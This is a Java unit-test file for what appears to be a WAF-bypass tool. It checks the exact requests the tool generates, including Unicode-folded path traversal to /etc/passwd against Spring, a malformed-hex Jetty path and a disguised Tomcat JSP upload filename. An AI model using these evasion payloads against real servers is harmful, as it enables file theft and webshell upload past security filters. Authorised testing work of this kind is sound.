package Main.ghostbits;

import org.junit.Before;
import org.junit.Test;
import org.yaml.snakeyaml.Yaml;

import java.io.InputStream;
import java.nio.charset.StandardCharsets;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;

import static org.junit.Assert.assertEquals;
import static org.junit.Assert.assertFalse;
import static org.junit.Assert.assertTrue;

public class AutoGhostBitsGeneratorTest {
    @Test public void chunkedBodyIsSkippedWhileTargetAndQueryCandidatesRemain() {
        Map<String, Object> local = new LinkedHashMap<>(options);
        Map<String, Object> generic = new LinkedHashMap<>();
        generic.put("enabled", true); generic.put("variant_count", 1);
        generic.put("strategies", java.util.Collections.singletonMap("minimal", true));
        local.put("generic", generic);
        byte[] request = ("POST /x?name=%2e HTTP/1.1\r\nHost: h.test\r\nContent-Type: application/json\r\n"
                + "Transfer-Encoding: chunked\r\n\r\nb\r\n{\"k\":\"../\"}\r\n0\r\n\r\n").getBytes(StandardCharsets.UTF_8);
        List<GhostBitsAutoVariant> variants = new AutoGhostBitsGenerator(rule, local).generate(request);
        assertFalse(variants.isEmpty());
        for (GhostBitsAutoVariant variant : variants) {
            assertTrue(variant.getTarget().equals("target") || variant.getTarget().equals("query"));
            String wire = new String(variant.getRequestBytes(), StandardCharsets.UTF_8);
            assertEquals(new String(request, StandardCharsets.UTF_8).split("\r\n\r\n", 2)[1], wire.split("\r\n\r\n", 2)[1]);
            assertFalse(wire.contains("Content-Length:"));
        }
    }

    @Test public void compressedBodyAndChunkedFilenameAreNotEditedAsPlainText() {
        Map<String, Object> local = new LinkedHashMap<>(options);
        local.put("templates", java.util.Collections.singletonMap("tomcat_jsp_upload", true));
        byte[] request = ("POST /x HTTP/1.1\r\nHost: h.test\r\nContent-Type: multipart/form-data; boundary=b\r\n"
                + "Transfer-Encoding: chunked\r\n\r\nContent-Disposition: form-data; name=\"file\"; filename=\"a.jsp\"\r\n").getBytes(StandardCharsets.UTF_8);
        assertTrue(new AutoGhostBitsGenerator(rule, local).generate(request).isEmpty());
        byte[] encoded = ("POST /x HTTP/1.1\r\nHost: h.test\r\nContent-Type: application/json\r\nContent-Encoding: gzip\r\n\r\n"
                + "{\"value\":\"%2e../\"}").getBytes(StandardCharsets.UTF_8);
        assertTrue(new AutoGhostBitsGenerator(rule, options).generate(encoded).isEmpty());
    }

    private GhostBitsRule rule;
    private Map<String, Object> options;

    @Before
    @SuppressWarnings("unchecked")
    public void setUp() throws Exception {
        try (InputStream in = getClass().getClassLoader().getResourceAsStream("BypassPro-config.yaml")) {
            Map<String, Object> config = new Yaml().load(in);
            Map<String, Object> profiles = (Map<String, Object>) config.get("profiles");
            Map<String, Object> manualWaf = (Map<String, Object>) profiles.get("manual_waf_bypass");
            Map<String, Object> ghostBits = (Map<String, Object>) manualWaf.get("ghost_bits");
            rule = GhostBitsRule.fromMap(ghostBits);

            Map<String, Object> waf = (Map<String, Object>) profiles.get("auto_waf_bypass");
            Map<String, Object> wafOptions = (Map<String, Object>) waf.get("options");
            options = (Map<String, Object>) wafOptions.get("ghost_bits");
        }
    }

    @Test
    public void generatesRawPathTemplateForSpring() {
        Map<String, Object> localOptions = enableOnlyTemplate("spring_static_lfi");
        byte[] req = ("GET /index HTTP/1.1\r\n"
                + "Host: localhost\r\n\r\n").getBytes(StandardCharsets.UTF_8);

        List<GhostBitsAutoVariant> variants = new AutoGhostBitsGenerator(rule, localOptions).generate(req);

        GhostBitsAutoVariant spring = find(variants, "spring_static_lfi");
        assertTrue(spring.isRawRequired());
        String request = new String(spring.getRequestBytes(), StandardCharsets.UTF_8);
        assertTrue(request.startsWith("GET /阮严灵丰丰甲来/阮严灵丰丰甲来/阮严灵丰丰甲来/etc/passw%64 HTTP/1.1"));
        assertTrue(spring.getReason().contains("sender:raw"));
        assertTrue(spring.getReason().contains("fold:"));
    }

    @Test
    public void generatesBurpVariantForAsciiJettyTemplate() {
        Map<String, Object> localOptions = enableOnlyTemplate("jetty_loose_hex");
        byte[] req = ("GET /index HTTP/1.1\r\n"
                + "Host: localhost\r\n\r\n").getBytes(StandardCharsets.UTF_8);

        List<GhostBitsAutoVariant> variants = new AutoGhostBitsGenerator(rule, localOptions).generate(req);

        GhostBitsAutoVariant jetty = find(variants, "jetty_loose_hex");
        assertFalse(jetty.isRawRequired());
        String request = new String(jetty.getRequestBytes(), StandardCharsets.UTF_8);
        assertTrue(request.startsWith("GET /setup/setup-s/%2>%2>/%2>%2>/log.jsp HTTP/1.1"));
        assertTrue(jetty.getReason().contains("sender:burp"));
    }

    @Test
    public void filenameTemplateUpdatesContentLength() {
        Map<String, Object> localOptions = enableOnlyTemplate("tomcat_jsp_upload");
        String body = "------b\r\n"
                + "Content-Disposition: form-data; name=\"file\"; filename=\"a.txt\"\r\n"
                + "Content-Type: text/plain\r\n\r\n"
                + "x\r\n"
                + "------b--\r\n";
        byte[] req = ("POST /upload HTTP/1.1\r\n"
                + "Host: localhost\r\n"
                + "Content-Type: multipart/form-data; boundary=----b\r\n"
                + "Content-Length: " + body.getBytes(StandardCharsets.UTF_8).length + "\r\n"
                + "\r\n"
                + body).getBytes(StandardCharsets.UTF_8);

        List<GhostBitsAutoVariant> variants = new AutoGhostBitsGenerator(rule, localOptions).generate(req);

        GhostBitsAutoVariant tomcat = find(variants, "tomcat_jsp_upload");
        assertTrue(tomcat.isRawRequired());
        String request = new String(tomcat.getRequestBytes(), StandardCharsets.UTF_8);
        assertTrue(request.contains("filename*=\"UTF-8''1.陪sp\""));
        int headerEnd = request.indexOf("\r\n\r\n") + 4;
        int bodyLength = tomcat.getRequestBytes().length - headerEnd;
        assertTrue(request.contains("Content-Length: " + bodyLength + "\r\n"));
    }

    @Test
    public void disabledSelectionTemplatesAreSkippedInAutoMode() {
        byte[] req = ("POST /json HTTP/1.1\r\n"
                + "Host: localhost\r\n"
                + "Content-Type: application/json\r\n"
                + "Content-Length: 11\r\n\r\n"
                + "{\"a\":\"b\"}").getBytes(StandardCharsets.UTF_8);

        List<GhostBitsAutoVariant> variants = new AutoGhostBitsGenerator(rule, options).generate(req);

        for (GhostBitsAutoVariant variant : variants) {
            assertFalse("selection templates should not be generated in first auto version",
                    "selection".equals(variant.getTarget()));
        }
    }

    @Test
    public void scenarioTemplatesAreDisabledByDefault() {
        byte[] req = ("GET /index HTTP/1.1\r\n"
                + "Host: localhost\r\n\r\n").getBytes(StandardCharsets.UTF_8);

        List<GhostBitsAutoVariant> variants = new AutoGhostBitsGenerator(rule, options).generate(req);

        for (GhostBitsAutoVariant variant : variants) {
            assertFalse("spring_static_lfi should be explicit opt-in",
                    "spring_static_lfi".equals(variant.getTemplateId()));
            assertFalse("jetty_loose_hex should be explicit opt-in",
                    "jetty_loose_hex".equals(variant.getTemplateId()));
            assertFalse("tomcat_jsp_upload should be explicit opt-in",
                    "tomcat_jsp_upload".equals(variant.getTemplateId()));
        }
    }

    @Test
    @SuppressWarnings("unchecked")
    public void genericPathFuzzUsesRemainingBudgetWhenEnabled() {
        Map<String, Object> localOptions = new LinkedHashMap<>(options);
        Map<String, Object> templates = new LinkedHashMap<>((Map<String, Object>) localOptions.get("templates"));
        for (String key : templates.keySet()) {
            templates.put(key, false);
        }
        localOptions.put("templates", templates);
        localOptions.put("max_variants", 2);

        Map<String, Object> generic = new LinkedHashMap<>();
        generic.put("enabled", true);
        generic.put("variant_count", 2);
        Map<String, Object> strategies = new LinkedHashMap<>();
        strategies.put("minimal", true);
        strategies.put("full", false);
        strategies.put("letters", false);
        strategies.put("digits", false);
        strategies.put("symbols", false);
        generic.put("strategies", strategies);
        localOptions.put("generic", generic);

        byte[] req = ("GET /a/../b?file=../../etc/passwd&safe=ok HTTP/1.1\r\n"
                + "Host: localhost\r\n\r\n").getBytes(StandardCharsets.UTF_8);

        List<GhostBitsAutoVariant> variants = new AutoGhostBitsGenerator(rule, localOptions).generate(req);

        assertFalse(variants.isEmpty());
        GhostBitsAutoVariant v = variants.get(0);
        assertEquals("eq_minimal", v.getTemplateId());
        assertTrue(v.isRawRequired());
        String request = new String(v.getRequestBytes(), StandardCharsets.UTF_8);
        assertTrue(request.contains(" HTTP/1.1"));
        String mutatedPath = request.substring("GET ".length(), request.indexOf(" HTTP/1.1"));
        assertEquals("/a/../b?file=../../etc/passwd&safe=ok", GhostBitsEngine.foldToAscii(mutatedPath));
        assertTrue("path separators must be preserved", mutatedPath.startsWith("/a/"));
        assertTrue("query separators must be preserved", mutatedPath.contains("?file="));
        assertTrue(v.getReason().contains("strategy:minimal"));
        assertTrue(v.getReason().contains("ghost:eq"));
        assertTrue(v.getReason().length() <= 220);
    }

    @Test
    @SuppressWarnings("unchecked")
    public void genericPathDoesNotInventPayloadForPlainPathByDefault() {
        byte[] req = ("GET /roche/jsq/h5/api/storage/view HTTP/1.1\r\n"
                + "Host: localhost\r\n\r\n").getBytes(StandardCharsets.UTF_8);

        List<GhostBitsAutoVariant> variants = new AutoGhostBitsGenerator(rule, options).generate(req);

        assertTrue("plain path has no default Ghost Bits equivalent mutation", variants.isEmpty());
    }

    @Test
    public void defaultDoesNotMistakeClassicForClassToken() {
        byte[] req = ("GET /api?name=classic HTTP/1.1\r\n"
                + "Host: localhost\r\n\r\n").getBytes(StandardCharsets.UTF_8);

        List<GhostBitsAutoVariant> variants = new AutoGhostBitsGenerator(rule, options).generate(req);

        assertTrue("classic must not match class token", variants.isEmpty());
    }

    @Test
    public void parserDifferentialOnlyMutatesExistingPercentHex() {
        byte[] req = ("GET /api/%2e%2e/admin HTTP/1.1\r\n"
                + "Host: localhost\r\n\r\n").getBytes(StandardCharsets.UTF_8);

        List<GhostBitsAutoVariant> variants = new AutoGhostBitsGenerator(rule, options).generate(req);

        GhostBitsAutoVariant parser = find(variants, "parser_percent_hex");
        String request = new String(parser.getRequestBytes(), StandardCharsets.UTF_8);
        assertTrue(request.startsWith("GET /api/%2>%2>/admin HTTP/1.1"));
        assertTrue(parser.getReason().contains("ghost:parser"));
    }

    @SuppressWarnings("unchecked")
    private Map<String, Object> enableOnlyTemplate(String enabledTemplate) {
        Map<String, Object> localOptions = new LinkedHashMap<>(options);
        Map<String, Object> templates = new LinkedHashMap<>((Map<String, Object>) localOptions.get("templates"));
        for (String key : templates.keySet()) {
            templates.put(key, key.equals(enabledTemplate));
        }
        localOptions.put("templates", templates);
        return localOptions;
    }

    private GhostBitsAutoVariant find(List<GhostBitsAutoVariant> variants, String templateId) {
        for (GhostBitsAutoVariant variant : variants) {
            if (templateId.equals(variant.getTemplateId())) {
                return variant;
            }
        }
        throw new AssertionError("template not generated: " + templateId + ", variants=" + variants.size());
    }
}
